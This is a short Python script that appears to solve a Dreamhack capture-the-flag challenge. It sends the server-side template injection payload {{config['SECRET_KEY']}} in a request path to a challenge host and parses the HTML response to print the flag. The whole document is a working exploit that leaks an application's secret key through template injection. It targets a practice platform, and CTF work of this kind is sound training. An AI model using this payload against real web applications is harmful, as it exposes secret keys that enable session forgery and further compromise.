import requests
from bs4 import BeautifulSoup as bs

URL = "http://host3.dreamhack.games:12193"
URI = "/"
PAYLOAD = "{{config['SECRET_KEY']}}"

resp = requests.get(URL + URI + PAYLOAD)
soup = bs(resp.text, "html.parser")

elements = soup.select('h3')

FLAG = elements[0].text.replace("/", "")

print(FLAG)